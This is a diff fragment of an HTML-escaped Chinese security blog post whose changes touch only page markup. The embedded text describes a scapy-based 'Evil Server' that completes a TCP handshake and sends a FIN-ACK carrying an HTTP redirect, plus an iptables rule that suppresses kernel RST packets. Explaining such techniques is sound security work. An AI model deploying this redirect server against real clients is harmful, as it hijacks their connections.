 &lt;span class=&quot;n&quot;&gt;SERVER_DOMAIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;example.me&quot;&lt;/span&gt;
@@ -1372,8 +1326,7 @@ Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
     &lt;span class=&quot;c&quot;&gt;# 对于 TCP 和 SERVER PORT 端口的包，回调 handle_packet 函数&lt;/span&gt;
     &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tcp and port &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SERVER_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handle_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;使用 scapy 框架，监听一个端口，在接收到 SYN 包之后，按照正常的握手流程返回 SYN-ACK，然后不等接收到 ACK 就继续发送 FIN-ACK，告诉客户端我要断开连接了，然后在这个包中包含有重定向的 HTTP 包。&lt;/p&gt;
 
@@ -1391,9 +1344,8 @@ Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
 
 &lt;p&gt;因为 scapy 是用户态的，防止内核不知道整个连接流程而发送 rst 包，可以使用下面的命令屏蔽掉&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.21.0.3 -j DROP
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.21.0.3 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;也有人使用内核模块实现了这个功能&lt;/p&gt;
 
